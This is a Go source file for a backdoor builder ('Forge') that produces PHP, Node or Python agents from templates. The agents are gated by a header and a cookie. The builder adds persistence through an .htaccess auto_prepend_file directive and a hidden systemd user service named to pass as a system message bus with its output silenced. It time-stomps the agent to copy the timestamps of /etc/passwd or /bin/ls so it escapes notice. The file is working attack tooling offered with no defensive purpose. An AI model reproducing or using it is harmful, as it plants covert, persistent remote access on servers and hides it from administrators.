package builder

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
)

// ForgeConfig v6.1 - Zero-Knowledge Hardened Forge
type ForgeConfig struct {
	OutputFile     string
	Password       string
	HeaderName     string
	HeaderValue    string
	CookieName     string
	PayloadDir     string
	Type           string // php, node, python
	InjectHtaccess bool
	InjectSystemd  bool
}

type Forge struct {
	config ForgeConfig
}

func NewForge(cfg ForgeConfig) *Forge {
	if cfg.Type == "" {
		cfg.Type = "php"
	}
	return &Forge{config: cfg}
}

func (f *Forge) Build() error {
	// 1. SELECT TEMPLATE
	templatePath := fmt.Sprintf("internal/template/agent.%s.template", f.config.Type)
	templateBytes, err := ioutil.ReadFile(templatePath)
	if err != nil {
		return fmt.Errorf("failed to read template for %s: %v", f.config.Type, err)
	}
	template := string(templateBytes)

	// 2. CRYPTO SETUP (Key Wrapping / KDF)
	// We generate a SALT. The REAL KEY is derived at runtime from HeaderValue + SALT.
	salt := make([]byte, 16)
	rand.Read(salt)
	saltHex := hex.EncodeToString(salt)

	// 3. REPLACEMENTS
	replacements := map[string]string{
		"__SALT_KEY__":    saltHex,
		"__HEADER_NAME__": f.config.HeaderName,
		// Note: We DO NOT store __HEADER_VALUE__ or __PASSWORD_HASH__ in the agent anymore!
		"__COOKIE_NAME__": f.config.CookieName,
	}

	finalCode := template
	for key, val := range replacements {
		finalCode = strings.ReplaceAll(finalCode, key, val)
	}

	// 4. PREPARE OUTPUT PATH
	outPath := f.config.OutputFile
	if f.config.PayloadDir != "" {
		os.MkdirAll(f.config.PayloadDir, 0755)
		outPath = filepath.Join(f.config.PayloadDir, filepath.Base(f.config.OutputFile))
	}

	// 5. WRITE AGENT
	if err := ioutil.WriteFile(outPath, []byte(finalCode), 0644); err != nil {
		return err
	}

	// 6. ADAPTED PERSISTENCE (Hardened)
	if f.config.Type == "php" {
		if f.config.InjectHtaccess {
			f.forgeHtaccess(outPath)
		}
	}
	if f.config.InjectSystemd {
		f.forgeSystemd(outPath)
	}

	// 7. UNIVERSAL TIME-STOMP
	f.stompV2(outPath)

	return nil
}

func (f *Forge) forgeHtaccess(targetPath string) {
	content := fmt.Sprintf(`
<IfModule mod_php7.c>
    php_value auto_prepend_file %s
</IfModule>
<IfModule mod_php.c>
    php_value auto_prepend_file %s
</IfModule>
`, targetPath, targetPath)
	ioutil.WriteFile(".htaccess", []byte(content), 0644)
}

func (f *Forge) forgeSystemd(targetPath string) {
	serviceName := f.randString(8)
	var execStart string
	switch f.config.Type {
	case "php":
		execStart = "/usr/bin/php " + targetPath
	case "node":
		execStart = "/usr/bin/node " + targetPath
	case "python":
		execStart = "/usr/bin/python3 " + targetPath
	}

	content := fmt.Sprintf(`[Unit]
Description=System Message Bus Service (Hardened)
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=120
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
`, execStart)

	path := filepath.Join(os.Getenv("HOME"), ".config/systemd/user")
	os.MkdirAll(path, 0755)
	ioutil.WriteFile(filepath.Join(path, serviceName+".service"), []byte(content), 0644)
}

func (f *Forge) stompV2(path string) {
	targets := []string{"/etc/passwd", "/bin/ls", "/var/www/html/index.php"}
	for _, t := range targets {
		if info, err := os.Stat(t); err == nil {
			os.Chtimes(path, info.ModTime(), info.ModTime())
			break
		}
	}
}

func (f *Forge) randString(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)[:n]
}
